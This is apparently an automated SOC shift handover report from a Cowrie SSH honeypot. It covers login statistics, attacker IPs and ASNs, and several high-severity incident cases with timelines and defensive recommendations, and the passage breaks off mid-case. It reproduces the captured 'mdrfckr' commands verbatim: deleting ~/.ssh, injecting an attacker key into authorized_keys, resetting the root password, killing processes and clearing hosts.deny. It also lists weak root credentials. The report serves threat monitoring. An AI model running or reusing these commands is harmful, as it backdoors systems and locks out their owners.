# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-14 |
| **Generated At** | 2026-04-14T21:00:15Z |
| **Shift Time** | 21:00 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **109** |
| Confirmed Threats | **106** |
| False Positives Filtered | **3** (2.8%) |
| Unique Attacker IPs | **18** |
| Countries of Origin | **7** |
| High Severity Cases | **30** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **79** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **60** |
| Unique Credential Pairs | **32** |
| Unique Usernames | **16** |
| Unique Passwords | **32** |
| Successful Auth Pairs | **23** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 30 |
| `345gs5662d34` | 14 |
| `ftpuser` | 2 |
| `ubuntu` | 2 |
| `ftptest` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 14 |
| `3245gs5662d34` | 14 |
| `QWE123qwe` | 3 |
| `root#123` | 1 |
| `Zf123456@` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 14 |
| `root` | `3245gs5662d34` | 14 |
| `root` | `QWE123qwe` | 3 |
| `root` | `root#123` | 1 |
| `root` | `Zf123456@` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root#123` | `101.29.255.113` | 2026-04-14T20:28:54 |
| `root` | `3245gs5662d34` | `101.29.255.113` | 2026-04-14T20:28:58 |
| `root` | `Zf123456@` | `76.79.213.70` | 2026-04-14T20:30:34 |
| `root` | `3245gs5662d34` | `76.79.213.70` | 2026-04-14T20:30:41 |
| `root` | `bbbb` | `172.185.24.228` | 2026-04-14T20:34:27 |
| `root` | `3245gs5662d34` | `172.185.24.228` | 2026-04-14T20:34:32 |
| `root` | `Root2023@123` | `172.185.24.228` | 2026-04-14T20:36:03 |
| `root` | `Qaz123456789` | `172.185.24.228` | 2026-04-14T20:37:46 |
| `root` | `P@ssw0rd@1234` | `172.185.24.228` | 2026-04-14T20:41:24 |
| `root` | `vagrant` | `101.126.83.70` | 2026-04-14T20:42:47 |
| `root` | `3245gs5662d34` | `101.126.83.70` | 2026-04-14T20:42:57 |
| `root` | `dupa` | `172.185.24.228` | 2026-04-14T20:45:02 |
| `root` | `Qazwsx001!@` | `172.185.24.228` | 2026-04-14T20:48:31 |
| `root` | `helloworld` | `172.185.24.228` | 2026-04-14T20:52:03 |
| `root` | `362514` | `124.156.129.246` | 2026-04-14T20:52:13 |
| `root` | `3245gs5662d34` | `124.156.129.246` | 2026-04-14T20:52:17 |
| `root` | `1q2w3e4r5t.` | `172.185.24.228` | 2026-04-14T20:53:45 |
| `root` | `QWE123qwe` | `103.183.74.214` | 2026-04-14T20:54:56 |
| `root` | `3245gs5662d34` | `103.183.74.214` | 2026-04-14T20:55:01 |
| `root` | `QWE123qwe` | `42.96.43.148` | 2026-04-14T20:57:36 |
| `root` | `3245gs5662d34` | `42.96.43.148` | 2026-04-14T20:57:39 |
| `root` | `QWE123qwe` | `183.250.89.44` | 2026-04-14T20:58:43 |
| `root` | `A123456F` | `172.185.24.228` | 2026-04-14T20:59:08 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **109** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 106 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 103 | 15 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 103 | 15 | Modern SSH client |
| `95420f9d932d...` | libssh | 3 | 2 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 15 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:yJk1i4ASjnV9"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `183.250.89.44`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `76.79.213.70`, `103.183.74.214`, `101.126.83.70`, `101.29.255.113`, `124.156.129.246`, `42.96.43.148`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **18** |
| Unique ASNs | **13** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS136052` | PT Cloud Hosting Indonesia | 1 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 1 | HIGH |
| `AS36352` | HostPapa | 1 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (30)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3b5d9e8394b5

| Field | Detail |
|---|---|
| **Source IP** | `101.29.255[.]113` |
| **First Seen** | 2026-04-14 20:28 |
| **Last Seen** | 2026-04-14 20:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:28:53` | `cowrie.session.connect` |
| `2026-04-14 20:28:53` | `cowrie.client.version` |
| `2026-04-14 20:28:53` | `cowrie.client.kex` |
| `2026-04-14 20:28:54` | `cowrie.login.success` |
| `2026-04-14 20:28:54` | `cowrie.session.params` |
| `2026-04-14 20:28:54` | `cowrie.command.input` |
| `2026-04-14 20:28:54` | `cowrie.command.failed` |
| `2026-04-14 20:28:54` | `cowrie.log.closed` |
| `2026-04-14 20:28:55` | `cowrie.session.params` |
| `2026-04-14 20:28:55` | `cowrie.command.input` |
| `2026-04-14 20:28:55` | `cowrie.session.file_download` |
| `2026-04-14 20:28:55` | `cowrie.log.closed` |
| `2026-04-14 20:28:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.29.255[.]113` to AbuseIPDB if not already reported
- [ ] Block `101.29.255[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4fa69b9f862

| Field | Detail |
|---|---|
| **Source IP** | `101.29.255[.]113` |
| **First Seen** | 2026-04-14 20:28 |
| **Last Seen** | 2026-04-14 20:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:28:57` | `cowrie.session.connect` |
| `2026-04-14 20:28:57` | `cowrie.client.version` |
| `2026-04-14 20:28:57` | `cowrie.client.kex` |
| `2026-04-14 20:28:58` | `cowrie.login.success` |
| `2026-04-14 20:28:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.29.255[.]113` to AbuseIPDB if not already reported
- [ ] Block `101.29.255[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35d1d762ad0f

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]70` |
| **First Seen** | 2026-04-14 20:30 |
| **Last Seen** | 2026-04-14 20:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:30:32` | `cowrie.session.connect` |
| `2026-04-14 20:30:32` | `cowrie.client.version` |
| `2026-04-14 20:30:33` | `cowrie.client.kex` |
| `2026-04-14 20:30:34` | `cowrie.login.success` |
| `2026-04-14 20:30:35` | `cowrie.session.params` |
| `2026-04-14 20:30:35` | `cowrie.command.input` |
| `2026-04-14 20:30:35` | `cowrie.command.failed` |
| `2026-04-14 20:30:35` | `cowrie.log.closed` |
| `2026-04-14 20:30:36` | `cowrie.session.params` |
| `2026-04-14 20:30:36` | `cowrie.command.input` |
| `2026-04-14 20:30:36` | `cowrie.session.file_download` |
| `2026-04-14 20:30:36` | `cowrie.log.closed` |
| `2026-04-14 20:30:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]70` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ede5a292f96d

| Field | Detail |
|---|---|
| **Source IP** | `76.79.213[.]70` |
| **First Seen** | 2026-04-14 20:30 |
| **Last Seen** | 2026-04-14 20:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:30:40` | `cowrie.session.connect` |
| `2026-04-14 20:30:40` | `cowrie.client.version` |
| `2026-04-14 20:30:40` | `cowrie.client.kex` |
| `2026-04-14 20:30:41` | `cowrie.login.success` |
| `2026-04-14 20:30:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.79.213[.]70` to AbuseIPDB if not already reported
- [ ] Block `76.79.213[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ddd7a79afe7

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 20:34 |
| **Last Seen** | 2026-04-14 20:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:34:26` | `cowrie.session.connect` |
| `2026-04-14 20:34:26` | `cowrie.client.version` |
| `2026-04-14 20:34:26` | `cowrie.client.kex` |
| `2026-04-14 20:34:27` | `cowrie.login.success` |
| `2026-04-14 20:34:27` | `cowrie.session.params` |
| `2026-04-14 20:34:27` | `cowrie.command.input` |
| `2026-04-14 20:34:27` | `cowrie.command.failed` |
| `2026-04-14 20:34:28` | `cowrie.log.closed` |
| `2026-04-14 20:34:28` | `cowrie.session.params` |
| `2026-04-14 20:34:28` | `cowrie.command.input` |
| `2026-04-14 20:34:28` | `cowrie.session.file_download` |
| `2026-04-14 20:34:28` | `cowrie.log.closed` |
| `2026-04-14 20:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adfb57116d84

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 20:34 |
| **Last Seen** | 2026-04-14 20:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:34:31` | `cowrie.session.connect` |
| `2026-04-14 20:34:31` | `cowrie.client.version` |
| `2026-04-14 20:34:31` | `cowrie.client.kex` |
| `2026-04-14 20:34:32` | `cowrie.login.success` |
| `2026-04-14 20:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e0f98bf2bf5

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 20:36 |
| **Last Seen** | 2026-04-14 20:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:36:01` | `cowrie.session.connect` |
| `2026-04-14 20:36:01` | `cowrie.client.version` |
| `2026-04-14 20:36:02` | `cowrie.client.kex` |
| `2026-04-14 20:36:03` | `cowrie.login.success` |
| `2026-04-14 20:36:03` | `cowrie.session.params` |
| `2026-04-14 20:36:03` | `cowrie.command.input` |
| `2026-04-14 20:36:03` | `cowrie.command.failed` |
| `2026-04-14 20:36:03` | `cowrie.log.closed` |
| `2026-04-14 20:36:04` | `cowrie.session.params` |
| `2026-04-14 20:36:04` | `cowrie.command.input` |
| `2026-04-14 20:36:04` | `cowrie.session.file_download` |
| `2026-04-14 20:36:04` | `cowrie.log.closed` |
| `2026-04-14 20:36:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4f22ccb7a68

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 20:36 |
| **Last Seen** | 2026-04-14 20:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:36:07` | `cowrie.session.connect` |
| `2026-04-14 20:36:07` | `cowrie.client.version` |
| `2026-04-14 20:36:07` | `cowrie.client.kex` |
| `2026-04-14 20:36:08` | `cowrie.login.success` |
| `2026-04-14 20:36:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e9dfc3b45b6

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 20:37 |
| **Last Seen** | 2026-04-14 20:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:37:45` | `cowrie.session.connect` |
| `2026-04-14 20:37:45` | `cowrie.client.version` |
| `2026-04-14 20:37:46` | `cowrie.client.kex` |
| `2026-04-14 20:37:46` | `cowrie.login.success` |
| `2026-04-14 20:37:47` | `cowrie.session.params` |
| `2026-04-14 20:37:47` | `cowrie.command.input` |
| `2026-04-14 20:37:47` | `cowrie.command.failed` |
| `2026-04-14 20:37:47` | `cowrie.log.closed` |
| `2026-04-14 20:37:48` | `cowrie.session.params` |
| `2026-04-14 20:37:48` | `cowrie.command.input` |
| `2026-04-14 20:37:48` | `cowrie.session.file_download` |
| `2026-04-14 20:37:48` | `cowrie.log.closed` |
| `2026-04-14 20:37:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4821e3ce70c

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 20:37 |
| **Last Seen** | 2026-04-14 20:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:37:51` | `cowrie.session.connect` |
| `2026-04-14 20:37:51` | `cowrie.client.version` |
| `2026-04-14 20:37:51` | `cowrie.client.kex` |
| `2026-04-14 20:37:52` | `cowrie.login.success` |
| `2026-04-14 20:37:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b40070db300

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 20:41 |
| **Last Seen** | 2026-04-14 20:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:41:23` | `cowrie.session.connect` |
| `2026-04-14 20:41:23` | `cowrie.client.version` |
| `2026-04-14 20:41:23` | `cowrie.client.kex` |
| `2026-04-14 20:41:24` | `cowrie.login.success` |
| `2026-04-14 20:41:25` | `cowrie.session.params` |
| `2026-04-14 20:41:25` | `cowrie.command.input` |
| `2026-04-14 20:41:25` | `cowrie.command.failed` |
| `2026-04-14 20:41:25` | `cowrie.log.closed` |
| `2026-04-14 20:41:26` | `cowrie.session.params` |
| `2026-04-14 20:41:26` | `cowrie.command.input` |
| `2026-04-14 20:41:26` | `cowrie.session.file_download` |
| `2026-04-14 20:41:26` | `cowrie.log.closed` |
| `2026-04-14 20:41:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbd8b283484c

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 20:41 |
| **Last Seen** | 2026-04-14 20:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:41:29` | `cowrie.session.connect` |
| `2026-04-14 20:41:29` | `cowrie.client.version` |
| `2026-04-14 20:41:29` | `cowrie.client.kex` |
| `2026-04-14 20:41:30` | `cowrie.login.success` |
| `2026-04-14 20:41:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05b295842ee8

| Field | Detail |
|---|---|
| **Source IP** | `101.126.83[.]70` |
| **First Seen** | 2026-04-14 20:42 |
| **Last Seen** | 2026-04-14 20:42 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
